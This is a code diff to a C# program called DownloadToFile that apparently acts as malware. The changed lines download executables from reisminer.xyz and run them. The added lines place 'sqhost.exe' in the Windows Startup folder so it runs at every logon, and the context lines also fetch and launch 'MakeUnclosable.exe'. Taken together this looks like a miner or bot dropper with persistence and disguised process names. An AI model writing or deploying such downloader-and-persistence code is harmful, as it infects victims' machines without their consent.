@@ -21,10 +21,11 @@ namespace DownloadToFile
                 Environment.GetFolderPath(Environment.SpecialFolder.Templates) + @"\MakeUnclosable.exe");
             Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + @"\MakeUnclosable.exe");
             
-            //get GetCommands
-            Client.DownloadFile("http://reisminer.xyz/exes/GetCommands.exe",
-                Environment.GetFolderPath(Environment.SpecialFolder.Templates) + @"\GetCommands.exe");
-            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) + @"\GetCommands.exe");
+            //get GetCommand
+            Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
+            Client.DownloadFile("http://reisminer.xyz/exes/sqhost.exe",
+                Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\sqhost.exe");
+            Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\sqhost.exe");
         }
     }
 }
